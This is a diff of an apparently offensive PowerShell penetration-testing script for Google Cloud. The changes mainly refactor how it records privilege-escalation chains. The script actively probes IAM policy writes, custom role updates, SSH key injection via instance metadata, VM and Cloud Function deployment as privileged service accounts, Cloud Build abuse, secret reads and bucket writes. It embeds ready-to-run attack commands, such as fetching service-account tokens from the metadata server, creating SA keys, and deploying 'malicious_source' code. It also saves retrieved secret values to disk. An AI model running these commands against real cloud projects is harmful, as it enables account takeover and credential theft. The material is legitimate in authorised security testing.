                 Write-Proof "[SETIAMPOLICY-$Project] setIamPolicy confirmed via role $matchedRole | $matchedRolePermStr`n"
-            } else {
+            }
+            else {
                 Write-Log "    setIamPolicy write DENIED despite having $matchedRole (org policy constraint?)" "WARN"
             }
-        } else {
-            # Probe / Safe mode: just record the finding without writing
+        }
+        else {
+            # Probe / Safe mode
             $chainID = "SETIAMPOLICY-$Project"
+            $steps = @(
+                "Current identity is bound to $matchedRole on project $Project",
+                "This role includes resourcemanager.projects.setIamPolicy",
+                $matchedRolePermStr,
+                "NOTE: Write not tested in $Mode mode - use -Mode Aggressive to confirm",
+                "If write succeeds, this is a full project compromise"
+            )
+            $commands = @(
+                "# To confirm (CAUTION - modifies IAM):",
+                "gcloud projects get-iam-policy $Project --format=json > policy.json",
+                "gcloud projects set-iam-policy $Project policy.json"
+            )
             Record-Chain -ChainID $chainID -Project $Project `
                 -Title "Project IAM Policy Write Access LIKELY (role: $matchedRole)" `
                 -Severity "CRITICAL" `
                 -InitialAccess "Current identity has $matchedRole which includes resourcemanager.projects.setIamPolicy. $matchedRolePermStr" `
                 -TargetPrivilege "Can likely grant ANY role to ANY identity on project $Project" `
-                -Steps @(
-                    "Current identity is bound to $matchedRole on project $Project",
-                    "This role includes resourcemanager.projects.setIamPolicy",
-                    "$(if ($matchedRolePermStr) { $matchedRolePermStr })",
-                    "NOTE: Write not tested in $Mode mode — use -Mode Aggressive to confirm",
-                    "If write succeeds, this is a full project compromise"
-                ) `
-                -Commands @(
-                    "# To confirm (CAUTION — modifies IAM):",
-                    "gcloud projects get-iam-policy $Project --format=json > policy.json",
-                    "gcloud projects set-iam-policy $Project policy.json"
-                ) `
+                -Steps $steps `
+                -Commands $commands `
                 -Impact "POTENTIAL FULL PROJECT TAKEOVER. Requires Aggressive mode test to confirm." `
                 -Proof "Role $matchedRole detected on current identity (write not attempted in $Mode mode)"
         }
-    } else {
+    }
+    else {
         Write-Log "    No setIamPolicy capability detected via role analysis" "FAIL"
     }
 }
@@ -754,7 +803,8 @@ function Test-CustomRoleEscalation {
 
         $roleDetail = Run-GcloudJson "iam roles describe $roleName --project=$Project"
         if (-not $roleDetail) { continue }
-        Save-Output "$dir\role_$($cr.title -replace '[^a-zA-Z0-9]','_')_current.json" $roleDetail
+        $safeCrTitle = $cr.title -replace '[^a-zA-Z0-9]', '_'
+        Save-Output "$dir\role_${safeCrTitle}_current.json" $roleDetail
 
         # Check if caller might have iam.roles.update
         $callerAccount = $Script:Manifest.caller_account
@@ -765,42 +815,56 @@ function Test-CustomRoleEscalation {
             foreach ($binding in $projData.iam_bindings) {
                 if ($binding.role -in $updateRoles) {
                     foreach ($m in $binding.members) {
-                        if ($m -match [regex]::Escape($callerAccount)) { $canUpdate = $true; break }
+                        if ($m -match [regex]::Escape($callerAccount)) {
+                            $canUpdate = $true
+                            break
+                        }
                     }
                 }
                 if ($canUpdate) { break }
             }
         }
+
         if ($canUpdate) {
-            $existingPerms = if ($roleDetail.includedPermissions) { @($roleDetail.includedPermissions) } else { @() }
+            $existingPerms = @()
+            if ($roleDetail.includedPermissions) {
+                $existingPerms = @($roleDetail.includedPermissions)
+            }
             $existingPrivEsc = @($existingPerms | Where-Object { $_ -in $Script:PrivEscPermissions })
-            $existingPermStr = if ($existingPrivEsc.Count -gt 0) {
-                "Current privesc permissions ($($existingPrivEsc.Count)): $($existingPrivEsc -join ', ')"
-            } else {
-                "Currently has $($existingPerms.Count) permissions (none are direct privesc permissions yet)"
+
+            if ($existingPrivEsc.Count -gt 0) {
+                $privEscList = $existingPrivEsc -join ', '
+                $existingPermStr = "Current privesc permissions ($($existingPrivEsc.Count)): $privEscList"
+            }
+            else {
+                $existingPermStr = "Currently has $($existingPerms.Count) permissions (none are direct privesc permissions yet)"
             }
 
-            $chainID = "CUSTOMROLE-$Project-$($cr.title -replace '[^a-zA-Z0-9]','_')"
+            $roleShort = ($roleName -split '/')[-1]
+            $chainID = "CUSTOMROLE-$Project-$safeCrTitle"
+            $steps = @(
+                "Custom role $roleName exists with title '$($cr.title)'",
+                "Role currently has $($existingPerms.Count) permissions total",
+                $existingPermStr,
+                "Current identity has a role granting iam.roles.update",
+                "Attacker can add dangerous permissions to this custom role",
+                "Any user/SA already bound to this role automatically inherits the new permissions"
+            )
+            $commands = @(
+                "# Add setIamPolicy permission to the custom role",
+                "gcloud iam roles update $roleShort --project=$Project --add-permissions=resourcemanager.projects.setIamPolicy",
+                "",
+                "# Or add SA impersonation",
+                "gcloud iam roles update $roleShort --project=$Project --add-permissions=iam.serviceAccounts.actAs,iam.serviceAccounts.getAccessToken"
+            )
+
             Record-Chain -ChainID $chainID -Project $Project `
                 -Title "Custom Role Update Possible: $($cr.title)" `
                 -Severity "HIGH" `
                 -InitialAccess "Current identity likely has iam.roles.update" `
                 -TargetPrivilege "Can add any permission (e.g., setIamPolicy, actAs) to custom role $roleName. $existingPermStr" `
-                -Steps @(
-                    "Custom role $roleName exists with title '$($cr.title)'",
-                    "Role currently has $($existingPerms.Count) permissions total",
-                    "$existingPermStr",
-                    "Current identity has a role granting iam.roles.update",
-                    "Attacker can add dangerous permissions to this custom role",
-                    "Any user/SA already bound to this role automatically inherits the new permissions"
-                ) `
-                -Commands @(
-                    "# Add setIamPolicy permission to the custom role",
-                    "gcloud iam roles update $($roleName -split '/' | Select-Object -Last 1) --project=$Project --add-permissions=resourcemanager.projects.setIamPolicy",
-                    "",
-                    "# Or add SA impersonation",
-                    "gcloud iam roles update $($roleName -split '/' | Select-Object -Last 1) --project=$Project --add-permissions=iam.serviceAccounts.actAs,iam.serviceAccounts.getAccessToken"
-                ) `
+                -Steps $steps `
+                -Commands $commands `
                 -Impact "Privilege escalation via custom role modification. Any identity bound to $roleName gains the injected permissions. This is stealthy because no new role bindings are created."
         }
     }
@@ -823,7 +887,6 @@ function Test-ComputeAbuse {
         $instSA = $inst.sa
         $scopes = $inst.scopes
 
-        # --- Test: setMetadata (SSH key injection) ---
         if ($Mode -eq "Aggressive") {
             Write-Log "    [AGGRESSIVE] Testing setMetadata on $name ($zone)" "WARN"
 
@@ -831,63 +894,88 @@ function Test-ComputeAbuse {
             if ($r) {
                 Save-Output "$dir\instance_$name.json" $r
 
-                $testR = Run-GcloudRaw "compute instances add-metadata $name --zone=$zone --project=$Project --metadata=pentest-probe-key=probe-$(Get-Date -Format 'yyyyMMddHHmmss')"
+                $probeTs = Get-Date -Format 'yyyyMMddHHmmss'
+                $testR = Run-GcloudRaw "compute instances add-metadata $name --zone=$zone --project=$Project --metadata=pentest-probe-key=probe-$probeTs"
                 if ($testR.success) {
                     $chainNum++
                     $chainID = "COMPUTE-META-$Project-$chainNum"
-
                     Record-Artifact -Type "METADATA" -Project $Project -Detail "Added metadata key 'pentest-probe-key' to instance $name"
 
-                    $saContext = if ($instSA) {
+                    # Build SA context string
+                    if ($instSA) {
                         $instSARoles = Get-SARolesOnProject -SAEmail $instSA -Project $Project
-                        $instSARolesStr = if ($instSARoles) { Format-RolesWithPerms -Roles $instSARoles } else { "(roles unknown)" }
-                        "Instance runs as SA: $instSA | Roles: $instSARolesStr"
-                    } else { "No SA attached" }
-                    $scopeInfo = if ($scopes -match "cloud-platform") { "FULL cloud-platform scope — SA has unrestricted API access" } else { "Limited scopes: $($scopes -join ', ')" }
+                        if ($instSARoles -and $instSARoles.Count -gt 0) {
+                            $instSARolesStr = Format-RolesWithPerms -Roles $instSARoles
+                        }
+                        else {
+                            $instSARolesStr = "(roles unknown)"
+                        }
+                        $saContext = "Instance runs as SA: $instSA | Roles: $instSARolesStr"
+                    }
+                    else {
+                        $saContext = "No SA attached"
+                    }
+
+                    if ($scopes -match "cloud-platform") {
+                        $scopeInfo = "FULL cloud-platform scope - SA has unrestricted API access"
+                    }
+                    else {
+                        $scopeList = $scopes -join ', '
+                        $scopeInfo = "Limited scopes: $scopeList"
+                    }
+
+                    $isCritical = $instSA -and ($scopes -match "cloud-platform")
+                    $severity = if ($isCritical) { "CRITICAL" } else { "HIGH" }
+
+                    $steps = @(
+                        "Confirmed metadata write on instance $name in zone $zone",
+                        "Attacker injects an SSH public key via instance metadata",
+                        "SSH into the instance using the injected key",
+                        $saContext,
+                        $scopeInfo,
+                        "From the instance, query the metadata server for the SA's OAuth token",
+                        "Use the token for GCP API calls as $instSA"
+                    )
+                    $commands = @(
+                        "# 1. Generate SSH key",
+                        "ssh-keygen -t rsa -b 2048 -f pentest_key -N ''",
+                        "",
+                        "# 2. Inject SSH key into instance metadata",
+                        "gcloud compute instances add-metadata $name --zone=$zone --project=$Project --metadata-from-file ssh-keys=ssh_keys.txt",
+                        "",
+                        "# 3. SSH into instance (if network allows)",
+                        "gcloud compute ssh pentest@$name --zone=$zone --project=$Project --ssh-key-file=pentest_key",
+                        "",
+                        "# 4. On the instance - get SA token from metadata server",
+                        "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                        "",
+                        "# 5. Use the token",
+                        "TOKEN=`$(curl ... | jq -r .access_token)",
+                        "curl -H 'Authorization: Bearer `$TOKEN' https://cloudresourcemanager.googleapis.com/v1/projects/$Project"
+                    )
 
                     Record-Chain -ChainID $chainID -Project $Project `
                         -Title "Compute Instance Metadata Write: $name" `
-                        -Severity $(if ($instSA -and $scopes -match "cloud-platform") { "CRITICAL" } else { "HIGH" }) `
+                        -Severity $severity `
                         -InitialAccess "Current identity has compute.instances.setMetadata on $name" `
                         -TargetPrivilege "SSH key injection -> shell access -> metadata server -> SA token ($instSA)" `
-                        -Steps @(
-                            "Confirmed metadata write on instance $name in zone $zone",
-                            "Attacker injects an SSH public key via instance metadata",
-                            "SSH into the instance using the injected key",
-                            "$saContext",
-                            "$scopeInfo",
-                            "From the instance, query the metadata server for the SA's OAuth token",
-                            "Use the token for GCP API calls as $instSA"
-                        ) `
-                        -Commands @(
-                            "# 1. Generate SSH key",
-                            "ssh-keygen -t rsa -b 2048 -f pentest_key -N '""'""'",
-                            "",
-                            "# 2. Inject SSH key into instance metadata",
-                            "gcloud compute instances add-metadata $name --zone=$zone --project=$Project --metadata-from-file ssh-keys=<(echo `"pentest:`$(cat pentest_key.pub)`")",
-                            "",
-                            "# 3. SSH into instance (if network allows)",
-                            "gcloud compute ssh pentest@$name --zone=$zone --project=$Project --ssh-key-file=pentest_key",
-                            "",
-                            "# 4. On the instance — get SA token from metadata server",
-                            "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-                            "",
-                            "# 5. Use the token",
-                            "TOKEN=`$(curl ... | jq -r .access_token)",
-                            "curl -H `"Authorization: Bearer `$TOKEN`" https://cloudresourcemanager.googleapis.com/v1/projects/$Project"
-                        ) `
+                        -Steps $steps `
+                        -Commands $commands `
                         -Impact "Shell access to $name, then SA impersonation via metadata server. SA=$instSA. $scopeInfo" `
                         -Proof "Metadata write confirmed (pentest-probe-key added)"
 
-                    Write-Proof "[$chainID] Metadata write on $name confirmed`nSA: $instSA | Scopes: $($scopes -join ', ')`n"
+                    $scopeList = $scopes -join ', '
+                    Write-Proof "[$chainID] Metadata write on $name confirmed`nSA: $instSA | Scopes: $scopeList`n"
 
                     # Clean up
                     Run-GcloudRaw "compute instances remove-metadata $name --zone=$zone --project=$Project --keys=pentest-probe-key" | Out-Null
-                } else {
+                }
+                else {
                     Write-Log "    DENIED: setMetadata on $name" "FAIL"
                 }
             }
-        } else {
+        }
+        else {
             Write-Log "    Skipping active metadata test on $name ($Mode mode)" "TEST"
         }
     }
@@ -900,21 +988,23 @@ function Test-ComputeAbuse {
             $testR = Run-GcloudRaw "compute project-info add-metadata --project=$Project --metadata=pentest-project-probe=probe"
             if ($testR.success) {
                 $chainID = "COMPUTE-PROJMETA-$Project"
+                $steps = @(
+                    "Project-wide metadata write confirmed on $Project",
+                    "Adding an SSH key to project metadata gives SSH access to ALL instances that don't block project-level keys",
+                    "Each instance's SA token becomes accessible via the metadata server",
+                    "This is a single-action compromise of all compute instances in the project"
+                )
+                $commands = @(
+                    "# Inject SSH key into ALL instances at once",
+                    "gcloud compute project-info add-metadata --project=$Project --metadata-from-file ssh-keys=ssh_keys.txt"
+                )
                 Record-Chain -ChainID $chainID -Project $Project `
                     -Title "Project-Wide Metadata Write CONFIRMED" `
                     -Severity "CRITICAL" `
                     -InitialAccess "Current identity has compute.projects.setCommonInstanceMetadata" `
                     -TargetPrivilege "SSH key injection into ALL instances in the project simultaneously" `
-                    -Steps @(
-                        "Project-wide metadata write confirmed on $Project",
-                        "Adding an SSH key to project metadata gives SSH access to ALL instances that don't block project-level keys",
-                        "Each instance's SA token becomes accessible via the metadata server",
-                        "This is a single-action compromise of all compute instances in the project"
-                    ) `
-                    -Commands @(
-                        "# Inject SSH key into ALL instances at once",
-                        "gcloud compute project-info add-metadata --project=$Project --metadata-from-file ssh-keys=<(echo `"pentest:`$(cat pentest_key.pub)`")"
-                    ) `
+                    -Steps $steps `
+                    -Commands $commands `
                     -Impact "MASS COMPROMISE: SSH access to every VM in $Project, with access to all attached SA tokens."
 
                 Record-Artifact -Type "PROJECT_METADATA" -Project $Project -Detail "Added project-wide metadata key pentest-project-probe"
@@ -949,32 +1039,41 @@ function Test-ComputeAbuse {
 
             if ($r.success) {
                 $vmSARoles = Get-SARolesOnProject -SAEmail $targetSA -Project $Project
-                $vmSARolesStr = if ($vmSARoles) { Format-RolesWithPerms -Roles $vmSARoles } else { "(unknown)" }
+                if ($vmSARoles -and $vmSARoles.Count -gt 0) {
+                    $vmSARolesStr = Format-RolesWithPerms -Roles $vmSARoles
+                }
+                else {
+                    $vmSARolesStr = "(unknown)"
+                }
+
                 $chainID = "COMPUTE-CREATE-$Project"
+                $steps = @(
+                    "Created VM $vmName in $testZone running as $targetSA",
+                    "SA roles on this project: $vmSARolesStr",
+                    "VM has cloud-platform scope (unrestricted API access)",
+                    "SSH into the VM and query the metadata server for the SA token",
+                    "All GCP API calls now execute as $targetSA"
+                )
+                $commands = @(
+                    "gcloud compute instances create evil-vm --zone=$testZone --project=$Project --service-account=$targetSA --scopes=cloud-platform --machine-type=e2-micro",
+                    "gcloud compute ssh evil-vm --zone=$testZone --project=$Project",
+                    "# On VM: curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+                )
+
                 Record-Chain -ChainID $chainID -Project $Project `
                     -Title "VM Created as Privileged SA: $targetSA" `
                     -Severity "CRITICAL" `
                     -InitialAccess "Current identity has compute.instances.create + iam.serviceAccounts.actAs on $targetSA" `
                     -TargetPrivilege "Code execution as $targetSA with full cloud-platform scope. SA roles: $vmSARolesStr" `
-                    -Steps @(
-                        "Created VM $vmName in $testZone running as $targetSA",
-                        "SA roles on this project: $vmSARolesStr",
-                        "VM has cloud-platform scope (unrestricted API access)",
-                        "SSH into the VM and query the metadata server for the SA token",
-                        "All GCP API calls now execute as $targetSA"
-                    ) `
-                    -Commands @(
-                        "gcloud compute instances create evil-vm --zone=$testZone --project=$Project --service-account=$targetSA --scopes=cloud-platform --machine-type=e2-micro",
-                        "gcloud compute ssh evil-vm --zone=$testZone --project=$Project",
-                        "# On VM: curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
-                    ) `
+                    -Steps $steps `
+                    -Commands $commands `
                     -Impact "Full code execution as $targetSA. SA roles: $vmSARolesStr. If SA has Editor/Owner, this is complete project compromise."
 
                 Record-Artifact -Type "VM" -Project $Project -Detail "Created VM $vmName in $testZone as $targetSA"
-
                 Write-Log "    Cleaning up probe VM $vmName ..." "WARN"
                 Run-GcloudRaw "compute instances delete $vmName --zone=$testZone --project=$Project --quiet" | Out-Null
-            } else {
+            }
+            else {
                 Write-Log "    DENIED: Cannot create instance as $targetSA (need actAs + create)" "FAIL"
             }
         }
@@ -1004,26 +1103,36 @@ function Test-ServerlessAbuse {
                 $testR = Run-GcloudRaw "functions deploy $fnShort --region=$fnRegion --project=$Project --update-env-vars PENTEST_PROBE=1 --format=json"
                 if ($testR.success) {
                     $fnSARoles = Get-SARolesOnProject -SAEmail $fnSA -Project $Project
-                    $fnSARolesStr = if ($fnSARoles) { Format-RolesWithPerms -Roles $fnSARoles } else { "(unknown)" }
+                    if ($fnSARoles -and $fnSARoles.Count -gt 0) {
+                        $fnSARolesStr = Format-RolesWithPerms -Roles $fnSARoles
+                    }
+                    else {
+                        $fnSARolesStr = "(unknown)"
+                    }
+
                     $chainID = "FUNC-UPDATE-$Project-$fnShort"
+                    $steps = @(
+                        "Function $fnShort in $fnRegion runs as SA $fnSA",
+                        "SA roles on this project: $fnSARolesStr",
+                        "Attacker can update the function source code",
+                        "Deploy code that reads the SA token from metadata and exfils it",
+                        "Or deploy code that performs privileged GCP API calls directly"
+                    )
+                    $fnRuntime = $fn.runtime
+                    $commands = @(
+                        "# Update the function with new source",
+                        "gcloud functions deploy $fnShort --region=$fnRegion --project=$Project --source=./malicious_source/ --runtime=$fnRuntime",
+                        "# Invoke to get token",
+                        "gcloud functions call $fnShort --region=$fnRegion --project=$Project"
+                    )
+
                     Record-Chain -ChainID $chainID -Project $Project `
                         -Title "Cloud Function Update: $fnShort (SA: $fnSA)" `
                         -Severity "CRITICAL" `
                         -InitialAccess "Current identity has cloudfunctions.functions.update + iam.serviceAccounts.actAs" `
                         -TargetPrivilege "Arbitrary code execution as $fnSA (roles: $fnSARolesStr)" `
-                        -Steps @(
-                            "Function $fnShort in $fnRegion runs as SA $fnSA",
-                            "SA roles on this project: $fnSARolesStr",
-                            "Attacker can update the function source code",
-                            "Deploy code that reads the SA token from metadata and exfils it",
-                            "Or deploy code that performs privileged GCP API calls directly"
-                        ) `
-                        -Commands @(
-                            "# Update the function with new source",
-                            "gcloud functions deploy $fnShort --region=$fnRegion --project=$Project --source=./malicious_source/ --runtime=$($fn.runtime)",
-                            "# Invoke to get token",
-                            "gcloud functions call $fnShort --region=$fnRegion --project=$Project"
-                        ) `
+                        -Steps $steps `
+                        -Commands $commands `
                         -Impact "Code execution as $fnSA. Roles: $fnSARolesStr. Function already has network access and SA credentials."
 
                     Record-Artifact -Type "FUNCTION_UPDATE" -Project $Project -Detail "Updated env var on function $fnShort"
@@ -1035,8 +1144,8 @@ function Test-ServerlessAbuse {
 
     # --- Cloud Functions: new function deployment capability ---
     if ($Mode -eq "Aggressive" -and $SAs.Count -gt 0) {
-        $targetSA = ($SAs | Where-Object { $_.is_default } | Select-Object -First 1).email
-        if (-not $targetSA) { $targetSA = $SAs[0].email }
+        $defaultSAObj = $SAs | Where-Object { $_.is_default } | Select-Object -First 1
+        $targetSA = if ($defaultSAObj) { $defaultSAObj.email } else { $SAs[0].email }
 
         if ($targetSA) {
             $projData = $Script:Manifest.projects[$Project]
@@ -1051,27 +1160,36 @@ function Test-ServerlessAbuse {
                         }
                     }
                 }
-                $canCreate = $callerRoles | Where-Object { $_ -match "owner|editor|cloudfunctions\.admin|cloudfunctions\.developer" }
-                if ($canCreate) {
-                    $callerRolesStr = Format-RolesWithPerms -Roles @($canCreate)
+                $canCreate = @($callerRoles | Where-Object { $_ -match "owner|editor|cloudfunctions\.admin|cloudfunctions\.developer" })
+                if ($canCreate.Count -gt 0) {
+                    $callerRolesStr = Format-RolesWithPerms -Roles $canCreate
                     $targetSARoles = Get-SARolesOnProject -SAEmail $targetSA -Project $Project
-                    $targetSARolesStr = if ($targetSARoles) { Format-RolesWithPerms -Roles $targetSARoles } else { "(unknown)" }
+                    if ($targetSARoles -and $targetSARoles.Count -gt 0) {
+                        $targetSARolesStr = Format-RolesWithPerms -Roles $targetSARoles
+                    }
+                    else {
+                        $targetSARolesStr = "(unknown)"
+                    }
+
                     $chainID = "FUNC-CREATE-$Project"
+                    $steps = @(
+                        "Current identity has function creation capability via: $callerRolesStr",
+                        "Cloud Functions API is enabled on this project",
+                        "Target SA for deployment: $targetSA",
+                        "Target SA roles: $targetSARolesStr",
+                        "Deployed function would execute as the SA with full credential access"
+                    )
+                    $commands = @(
+                        "gcloud functions deploy pentest-probe --runtime=python311 --trigger-http --allow-unauthenticated --source=probe_fn/ --entry-point=handler --service-account=$targetSA --project=$Project --region=us-central1"
+                    )
+
                     Record-Chain -ChainID $chainID -Project $Project `
                         -Title "Cloud Function Deployment Possible as $targetSA" `
                         -Severity "HIGH" `
                         -InitialAccess "Current identity has cloudfunctions.functions.create via $callerRolesStr" `
                         -TargetPrivilege "Deploy function as $targetSA (roles: $targetSARolesStr) for code execution" `
-                        -Steps @(
-                            "Current identity has function creation capability via: $callerRolesStr",
-                            "Cloud Functions API is enabled on this project",
-                            "Target SA for deployment: $targetSA",
-                            "Target SA roles: $targetSARolesStr",
-                            "Deployed function would execute as the SA with full credential access"
-                        ) `
-                        -Commands @(
-                            "gcloud functions deploy pentest-probe --runtime=python311 --trigger-http --allow-unauthenticated --source=probe_fn/ --entry-point=handler --service-account=$targetSA --project=$Project --region=us-central1"
-                        ) `
+                        -Steps $steps `
+                        -Commands $commands `
                         -Impact "Arbitrary code execution as $targetSA (roles: $targetSARolesStr). Combined with actAs, this chains to the SA's full privileges."
                 }
             }
@@ -1128,47 +1246,56 @@ function Test-CloudBuildAbuse {
                 if ($pInfo) { $projNum = $pInfo.projectNumber }
                 $cbSA = "${projNum}@cloudbuild.gserviceaccount.com"
 
-                # Look up the actual roles/permissions the Cloud Build SA has
                 $cbSARoles = Get-SARolesOnProject -SAEmail $cbSA -Project $Project
-                $cbSARolesStr = if ($cbSARoles) { Format-RolesWithPerms -Roles $cbSARoles } else { "roles/editor + iam.serviceAccounts.actAs (typical defaults — could not confirm from manifest)" }
+                if ($cbSARoles -and $cbSARoles.Count -gt 0) {
+                    $cbSARolesStr = Format-RolesWithPerms -Roles $cbSARoles
+                }
+                else {
+                    $cbSARolesStr = "roles/editor + iam.serviceAccounts.actAs (typical defaults - could not confirm from manifest)"
+                }
+
+                $steps = @(
+                    "Build submission confirmed on project $Project",
+                    "Cloud Build SA: $cbSA",
+                    "SA roles on this project: $cbSARolesStr",
+                    "Attacker submits a build that reads the SA token from the metadata server",
+                    "Or the build step directly calls gcloud to create SA keys, modify IAM, etc.",
+                    "The Cloud Build SA can then impersonate ANY service account in the project"
+                )
+                $commands = @(
+                    "# cloudbuild.yaml that exfils the build SA's token + creates an owner SA key",
+                    "# steps:",
+                    "#   - name: gcr.io/cloud-builders/gcloud",
+                    "#     entrypoint: bash",
+                    "#     args:",
+                    "#       - -c",
+                    "#       - |",
+                    "#         curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                    "#         gcloud iam service-accounts keys create /workspace/key.json --iam-account=TARGET_SA@$Project.iam.gserviceaccount.com",
+                    "",
+                    "gcloud builds submit --no-source --config=cloudbuild.yaml --project=$Project"
+                )
 
                 Record-Chain -ChainID $chainID -Project $Project `
                     -Title "Cloud Build Submission CONFIRMED" `
                     -Severity "CRITICAL" `
                     -InitialAccess "Current identity has cloudbuild.builds.create" `
                     -TargetPrivilege "Arbitrary command execution as Cloud Build SA ($cbSA). SA roles: $cbSARolesStr" `
-                    -Steps @(
-                        "Build submission confirmed on project $Project",
-                        "Cloud Build SA: $cbSA",
-                        "SA roles on this project: $cbSARolesStr",
-                        "Attacker submits a build that reads the SA token from the metadata server",
-                        "Or the build step directly calls gcloud to create SA keys, modify IAM, etc.",
-                        "The Cloud Build SA can then impersonate ANY service account in the project"
-                    ) `
-                    -Commands @(
-                        "# cloudbuild.yaml that exfils the build SA's token + creates an owner SA key",
-                        "# steps:",
-                        "#   - name: gcr.io/cloud-builders/gcloud",
-                        "#     entrypoint: bash",
-                        "#     args:",
-                        "#       - -c",
-                        "#       - |",
-                        "#         curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-                        "#         gcloud iam service-accounts keys create /workspace/key.json --iam-account=TARGET_SA@$Project.iam.gserviceaccount.com",
-                        "",
-                        "gcloud builds submit --no-source --config=cloudbuild.yaml --project=$Project"
-                    ) `
+                    -Steps $steps `
+                    -Commands $commands `
                     -Impact "CRITICAL: Cloud Build SA has near-Owner privileges. Full project compromise via SA key creation, IAM modification, secret access, and more." `
                     -Proof "Build submitted successfully (async)"
 
                 Record-Artifact -Type "CLOUD_BUILD" -Project $Project -Detail "Submitted probe build"
-            } else {
+            }
+            else {
                 Write-Log "    DENIED: Cannot submit builds" "FAIL"
             }
-        } else {
+        }
+        else {
             $r = Run-GcloudRaw "builds list --project=$Project --limit=1 --format=json"
             if ($r.success) {
-                Write-Log "    Can list builds — cloudbuild.builds.list confirmed" "OK"
+                Write-Log "    Can list builds - cloudbuild.builds.list confirmed" "OK"
             }
         }
     }
@@ -1204,8 +1331,14 @@ function Test-SecretAccess {
             $chainID = "SECRET-$Project-$chainNum"
 
             $value = $r.stdout
-            $truncated = if ($value.Length -gt 80) { $value.Substring(0,80) + "...[TRUNCATED]" } else { $value }
+            if ($value.Length -gt 80) {
+                $truncated = $value.Substring(0, 80) + "...[TRUNCATED]"
+            }
+            else {
+                $truncated = $value
+            }
 
+            # Classify secret type
             $secretType = "Unknown"
             if ($value -match '"type"\s*:\s*"service_account"') { $secretType = "GCP Service Account Key JSON" }
             elseif ($value -match "^-----BEGIN") { $secretType = "Private Key / Certificate" }
@@ -1218,34 +1351,46 @@ function Test-SecretAccess {
 
             $severity = if ($secretType -match "Service Account Key|Private Key|Password|Database") { "CRITICAL" } else { "HIGH" }
 
+            # Build context-aware steps
+            $steps = @(
+                "Accessed secret '$secretName' in project $Project",
+                "Secret type identified as: $secretType"
+            )
+            if ($secretType -eq "GCP Service Account Key JSON") {
+                $steps += "This is a GCP SA key - can be used to authenticate as that SA for persistent access"
+            }
+            if ($secretType -match "Database") {
+                $steps += "This is a database connection string - direct database access possible"
+            }
+            if ($secretType -match "GitHub") {
+                $steps += "This is a GitHub token - source code access and potential supply chain attack"
+            }
+
+            $commands = @(
+                "gcloud secrets versions access latest --secret=$secretName --project=$Project"
+            )
+            if ($secretType -eq "GCP Service Account Key JSON") {
+                $commands += ""
+                $commands += "# Activate the SA key:"
+                $commands += "gcloud secrets versions access latest --secret=$secretName --project=$Project > sa_key.json"
+                $commands += "gcloud auth activate-service-account --key-file=sa_key.json"
+            }
+
             Record-Chain -ChainID $chainID -Project $Project `
                 -Title "Secret Accessible: $secretName ($secretType)" `
                 -Severity $severity `
                 -InitialAccess "Current identity has secretmanager.versions.access on $secretName" `
-                -TargetPrivilege "Secret value retrieved — type: $secretType" `
-                -Steps @(
-                    "Accessed secret '$secretName' in project $Project",
-                    "Secret type identified as: $secretType",
-                    "$(if ($secretType -eq 'GCP Service Account Key JSON') { 'This is a GCP SA key — can be used to authenticate as that SA for persistent access' })",
-                    "$(if ($secretType -match 'Database') { 'This is a database connection string — direct database access possible' })",
-                    "$(if ($secretType -match 'GitHub') { 'This is a GitHub token — source code access and potential supply chain attack' })"
-                ) `
-                -Commands @(
-                    "gcloud secrets versions access latest --secret=$secretName --project=$Project",
-                    "",
-                    "$(if ($secretType -eq 'GCP Service Account Key JSON') {
-                        "# Activate the SA key:`ngcloud auth activate-service-account --key-file=<(gcloud secrets versions access latest --secret=$secretName --project=$Project)"
-                    })"
-                ) `
+                -TargetPrivilege "Secret value retrieved - type: $secretType" `
+                -Steps $steps `
+                -Commands $commands `
                 -Impact "Credential theft. Secret type: $secretType. May enable lateral movement, external system access, or further privilege escalation." `
                 -Proof "Value preview: $truncated"
 
-            $safeSecretName = $secretName -replace '[^a-zA-Z0-9_-]','_'
+            $safeSecretName = $secretName -replace '[^a-zA-Z0-9_-]', '_'
             Save-Output "$dir\secret_value_$safeSecretName.txt" $value
-
             Write-Proof "[$chainID] Secret: $secretName | Type: $secretType`nPreview: $truncated`n"
-
-        } else {
+        }
+        else {
             Write-Log "    DENIED: Cannot access $secretName" "FAIL"
         }
     }
@@ -1270,9 +1415,10 @@ function Test-StorageAccess {
         $canRead = $false
         try {
             $lsOut = gsutil ls "gs://$bucket/" 2>&1 | Select-Object -First 10
-            $lsErr = ($lsOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
+            $lsErr = @($lsOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
             $canRead = (-not ($lsErr -match "AccessDeniedException|403"))
-        } catch {}
+        }
+        catch { }
 
         # Test write
         $canWrite = $false
@@ -1280,16 +1426,18 @@ function Test-StorageAccess {
             try {
                 $probeFile = "$dir\_write_probe.tmp"
                 Set-Content -Path $probeFile -Value "pentest-probe-$(Get-Date -Format 'o')"
-                $cpOut = gsutil cp $probeFile "gs://$bucket/.pentest-probe-$(Get-Random).tmp" 2>&1
-                $cpErr = ($cpOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
+                $rndNum = Get-Random
+                $cpOut = gsutil cp $probeFile "gs://$bucket/.pentest-probe-$rndNum.tmp" 2>&1
+                $cpErr = @($cpOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
                 $canWrite = (-not ($cpErr -match "AccessDeniedException|403|Forbidden"))
                 Remove-Item $probeFile -ErrorAction SilentlyContinue
                 if ($canWrite) {
-                    $probeObj = ($cpOut | Where-Object { $_ -match "gs://" }) -replace '.*?(gs://\S+).*','$1'
+                    $probeObj = @($cpOut | Where-Object { $_ -match "gs://" }) -replace '.*?(gs://\S+).*', '$1'
                     if ($probeObj) { gsutil rm $probeObj 2>$null }
                     Record-Artifact -Type "BUCKET_WRITE" -Project $Project -Detail "Write probe to $bucket (cleaned up)"
                 }
-            } catch { }
+            }
+            catch { }
         }
 
         if ($canRead -or $canWrite) {
